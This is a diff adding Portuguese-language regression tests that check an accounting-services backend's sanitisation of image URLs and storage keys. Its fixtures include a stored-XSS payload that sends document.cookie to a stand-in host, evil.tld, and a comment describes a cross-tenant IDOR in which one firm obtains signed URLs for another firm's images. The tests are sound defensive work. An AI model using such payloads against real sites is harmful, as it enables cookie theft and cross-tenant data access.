@@ -852,3 +852,85 @@ test('normalizeIntakeStartMode: default é formulário primeiro', () => {
   assert.equal(accountingServicesService.normalizeIntakeStartMode('calendar'), 'calendar');
   assert.equal(accountingServicesService.normalizeIntakeStartMode('outro'), 'form');
 });
+
+test('create: rejeita imageUrl com esquema javascript: em vez de gravar cru (stored XSS)', async () => {
+  resetMocks();
+  let savedImageUrl = 'não-chamado';
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    savedImageUrl = args.imageUrl;
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: {
+      name: 'Consultoria',
+      durationMinutes: 60,
+      imageUrl: "javascript:fetch('//evil.tld/x?c='+document.cookie)",
+    },
+  });
+
+  assert.equal(savedImageUrl, null, 'URI javascript: nunca deve chegar ao INSERT');
+});
+
+test('create: preserva storage key própria (firm/...) e URL https legítima em imageUrl', async () => {
+  resetMocks();
+  const saved = [];
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    saved.push(args.imageUrl);
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'A', durationMinutes: 30, imageUrl: 'firm/firm-x/services/img.png' },
+  });
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'B', durationMinutes: 30, imageUrl: 'https://cdn.teglion.com/img.png' },
+  });
+
+  assert.deepEqual(saved, ['firm/firm-x/services/img.png', 'https://cdn.teglion.com/img.png']);
+});
+
+// Regressão (segunda auditoria): sanitizeImageRefForStorage aceitava qualquer storage
+// key "firm/..." sem confirmar que pertence à própria firm — um utilizador da Firm B
+// podia apontar imageStorageKey para "firm/<firm-A>/..." e o backend geraria-lhe uma
+// signed URL para a imagem de OUTRA firm (createSignedDownloadUrl usa service_role,
+// ignora RLS). IDOR cross-tenant na mesma superfície do fix de XSS.
+test('create: rejeita imageStorageKey que aponta para o storage de OUTRA firm', async () => {
+  resetMocks();
+  let savedImageUrl = 'não-chamado';
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    savedImageUrl = args.imageUrl;
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-b',
+    payload: { name: 'Consultoria', durationMinutes: 60, imageStorageKey: 'firm/firm-a/services/segredo.png' },
+  });
+
+  assert.equal(savedImageUrl, null, 'storage key de outra firm nunca deve ser aceite');
+});
+
+test('create: imageOriginalUrl passa pela mesma sanitização que imageUrl', async () => {
+  resetMocks();
+  let savedOriginal = 'não-chamado';
+  mock.method(accountingServicesRepository, 'createRow', async (args) => {
+    savedOriginal = args.imageOriginalUrl;
+    return { id: 'svc-1', ...args };
+  });
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'A', durationMinutes: 30, imageOriginalUrl: "javascript:alert(1)" },
+  });
+  assert.equal(savedOriginal, null);
+
+  await accountingServicesService.create({
+    firmId: 'firm-x',
+    payload: { name: 'B', durationMinutes: 30, imageOriginalUrl: 'https://cdn.teglion.com/original.png' },
+  });
+  assert.equal(savedOriginal, 'https://cdn.teglion.com/original.png');
+});
